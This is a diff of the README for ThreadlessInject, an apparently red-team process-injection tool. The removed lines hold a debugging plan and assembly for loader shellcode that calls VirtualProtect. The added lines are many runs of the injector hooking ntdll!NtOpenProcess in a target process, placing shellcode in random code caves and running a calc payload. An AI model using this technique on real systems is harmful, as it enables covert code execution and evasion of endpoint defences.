@@ -28,52 +28,173 @@ From my Bsides Cymru 2023 talk: **[Needles Without the Thread](https://pretalx.c
 - [x] Avoid RWX on hooked function.  Hook assembly will need to handle VirtualProtect calls.
 - [x] Support any DLL via remote module enumeration.
 
-### Debugging Plan for RWX Avoidance
-#### Check current flow
-* Increase the injectors timeout to 60min in Main()
-* Execute the target (e.g. Notepad) and attach a debugger
-* Set a breakpoint on the target function (e.g. `bp kernelbase!MapViewOfFileEx`)
-* Print the start of the original (unhooked) function with `u kernelbase!MapViewOfFileEx L3`
-* Print the mem protection with `!vprot kernelbase!MapViewOfFileEx`, should be RX
-* Execute the injector `.\ThreadlessInject.exe -p (Get-Process "Notepad").id -d kernelbase.dll -e MapViewOfFileEx`
-* Print the mem protection again with `!vprot kernelbase!MapViewOfFileEx`, should be RWX
-* Continue the debugged process and let the breakpoint hit (e.g. press save in Notepad)
-* Note the new call instruction at the start of the now hooked function
-* Set a second breakpoint in the code cave (where the loader shellcode is injected e.g. `bp 00007ffcfb520000`)
-* Continue again and the loader shellcode should be hit
-* Continue again and calc should pop
-
-#### Update the code logic
-* Reset the hooked function memory protection to RX again right after the hook is written
-* Update the restore section in the shellcode loader itself
-    * Right be before the movabs,mov instructions a VirtualProctect must set RWX to the hooked function
-    * The hooked function is restored with movabs,mov
-    * Immidiately after mov a VirtualProctect must reset to RX
-
-#### Update the loader shellcode
-```asm
-sub rsp, 30h          ; Allocate shadow space (20h) + extra space for oldProtect variable (8h)
-mov rcx, hookedFunc   ; Arg 1: The Address of the hooked function
-mov rdx, 8            ; Arg 2: Size (only the first 8 bytes must be overwritten)
-mov r8, 40h           ; Arg 3: New protect (PAGE_EXECUTE_READWRITE)
-lea r9, [rsp + 20h]   ; Arg 4: Point out variable r9 to a temporary stack
-mov rax, VirtProt     ; addr of VirtualProtect, must be calculated and written by injector
-call rax
-add rsp, 30h          ; Clean up stack
-```
-
-#### Check the new flow
-* Execute the target (e.g. Notepad) and attach a debugger
-* Set a breakpoint on the target function (e.g. `bp kernelbase!MapViewOfFileEx`)
-* Print the start of the original (unhooked) function with `u kernelbase!MapViewOfFileEx L3`
-* Print the mem protection with `!vprot kernelbase!MapViewOfFileEx`, should be RX
-* Execute the injector `.\ThreadlessInject.exe -p (Get-Process "Notepad").id -d kernelbase.dll -e MapViewOfFileEx`
-* Print the mem protection again with `!vprot kernelbase!MapViewOfFileEx`, **should STILL be RX**
-* Continue the debugged process and let the breakpoint hit (e.g. press save in Notepad)
-* Note the new call instruction at the start of the now hooked function
-* Set a second breakpoint in the code cave (where the loader shellcode is injected e.g. `bp 00007ffcfb520000`)
-* Continue again and the loader shellcode should be hit
-* Single step to debug the new restore logic
-* Continue again and calc should pop
-* ?
-* Profit
+### Debug Info for NtOpenProcess in PowerShell with Random Code Cave
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 2 exec sections in current module C:\Windows\System32\srvcli.dll at 0x7ffa6f7b0000
+[.] Checking 0x7ffa6f7b1000
+[.] Checking 0x7ffa6f7bf000
+[=] Found code cave of size 246 at 0x7ffa6f7bff0a
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0033491s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 2 exec sections in current module C:\WINDOWS\SYSTEM32\VERSION.dll at 0x7ffa8b0c0000
+[.] Checking 0x7ffa8b0c1000
+[.] Checking 0x7ffa8b0c4000
+[=] Found code cave of size 246 at 0x7ffa8b0c101a
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0057554s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 1 exec sections in current module C:\WINDOWS\System32\win32u.dll at 0x7ffa91110000
+[.] Checking 0x7ffa91111000
+[:] Got 2 exec sections in current module C:\WINDOWS\SYSTEM32\gpapi.dll at 0x7ffa903f0000
+[.] Checking 0x7ffa903f1000
+[.] Checking 0x7ffa90404000
+[=] Found code cave of size 246 at 0x7ffa903f100b
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0138735s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 1 exec sections in current module C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26090.9-0\MPCLIENT.DLL at 0x7ffa6fe20000
+[.] Checking 0x7ffa6fe21000
+[:] Got 2 exec sections in current module C:\WINDOWS\SYSTEM32\cscapi.dll at 0x7ffa76ef0000
+[.] Checking 0x7ffa76ef1000
+[.] Checking 0x7ffa76efa000
+[=] Found code cave of size 246 at 0x7ffa76efaf0a
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0116599s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 2 exec sections in current module C:\Windows\System32\SspiCli.dll at 0x7ffa90070000
+[.] Checking 0x7ffa90071000
+[.] Checking 0x7ffa90095000
+[=] Found code cave of size 246 at 0x7ffa90095f0a
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0048565s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 3 exec sections in current module C:\WINDOWS\System32\WS2_32.dll at 0x7ffa91da0000
+[.] Checking 0x7ffa91da1000
+[.] Checking 0x7ffa91df2000
+[.] Checking 0x7ffa91df6000
+[=] Found code cave of size 246 at 0x7ffa91df6f0a
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0147853s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 1 exec sections in current module C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll at 0x7ffa3b2b0000
+[.] Checking 0x7ffa3b2b1000
+[:] Got 1 exec sections in current module C:\WINDOWS\Microsoft.Net\assembly\GAC_64\System.Transactions\v4.0_4.0.0.0__b77a5c561934e089\System.Transactions.dll at 0x7ffa76150000
+[.] Checking 0x7ffa76151000
+[:] Got 2 exec sections in current module C:\WINDOWS\SYSTEM32\urlmon.dll at 0x7ffa6fc30000
+[.] Checking 0x7ffa6fc31000
+[.] Checking 0x7ffa6fd5f000
+[=] Found code cave of size 246 at 0x7ffa6fd5ff0a
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0080868s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 1 exec sections in current module C:\WINDOWS\SYSTEM32\VCRUNTIME140_1_CLR0400.dll at 0x7ffa5f910000
+[.] Checking 0x7ffa5f911000
+[:] Got 2 exec sections in current module C:\WINDOWS\system32\rsaenh.dll at 0x7ffa8fd10000
+[.] Checking 0x7ffa8fd11000
+[.] Checking 0x7ffa8fd38000
+[=] Found code cave of size 246 at 0x7ffa8fd38f0a
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0146312s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 2 exec sections in current module C:\WINDOWS\System32\USER32.dll at 0x7ffa91fe0000
+[.] Checking 0x7ffa91fe1000
+[.] Checking 0x7ffa9209a000
+[=] Found code cave of size 246 at 0x7ffa9209af0a
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0123891s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 2 exec sections in current module C:\WINDOWS\System32\CRYPT32.dll at 0x7ffa911d0000
+[.] Checking 0x7ffa911d1000
+[.] Checking 0x7ffa912fc000
+[=] Found code cave of size 246 at 0x7ffa912fcf0a
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0125268s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 2 exec sections in current module C:\WINDOWS\System32\OLEAUT32.dll at 0x7ffa92390000
+[.] Checking 0x7ffa92391000
+[.] Checking 0x7ffa92431000
+[=] Found code cave of size 246 at 0x7ffa92431f0a
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0050492s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 1 exec sections in current module C:\WINDOWS\Microsoft.Net\assembly\GAC_64\System.Transactions\v4.0_4.0.0.0__b77a5c561934e089\System.Transactions.dll at 0x7ffa76150000
+[.] Checking 0x7ffa76151000
+[:] Got 1 exec sections in current module C:\WINDOWS\SYSTEM32\VCRUNTIME140_1_CLR0400.dll at 0x7ffa5f910000
+[.] Checking 0x7ffa5f911000
+[:] Got 1 exec sections in current module C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll at 0x7ffa39820000
+[.] Checking 0x7ffa39821000
+[:] Got 2 exec sections in current module C:\WINDOWS\System32\OLEAUT32.dll at 0x7ffa92390000
+[.] Checking 0x7ffa92391000
+[.] Checking 0x7ffa92431000
+[=] Found code cave of size 246 at 0x7ffa92431e14
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0133927s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 2 exec sections in current module C:\WINDOWS\SYSTEM32\cscapi.dll at 0x7ffa76ef0000
+[.] Checking 0x7ffa76ef1000
+[.] Checking 0x7ffa76efa000
+[=] Found code cave of size 246 at 0x7ffa76efae14
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0108269s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 1 exec sections in current module C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System.Confe64a9051#\7cf2a06a04cbdaa5c2bb2b4a70cb22b9\System.Configuration.Install.ni.dll at 0x7ffa82d00000
+[.] Checking 0x7ffa82d07000
+[:] Got 2 exec sections in current module C:\WINDOWS\System32\LINKINFO.dll at 0x7ffa7c120000
+[.] Checking 0x7ffa7c121000
+[.] Checking 0x7ffa7c126000
+[=] Found code cave of size 246 at 0x7ffa7c126f0a
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0123265s and export is restored
+PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
+[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
+[=] Opened process with id 3880
+[=] No shellcode supplied, using calc shellcode
+[:] Got 2 exec sections in current module C:\Windows\System32\SspiCli.dll at 0x7ffa90070000
+[.] Checking 0x7ffa90071000
+[.] Checking 0x7ffa90095000
+[=] Found code cave of size 246 at 0x7ffa90095e14
+[+] Shellcode injected, Waiting 60s for the hook to be called
+[+] Shellcode executed after 1.0054352s and export is restored
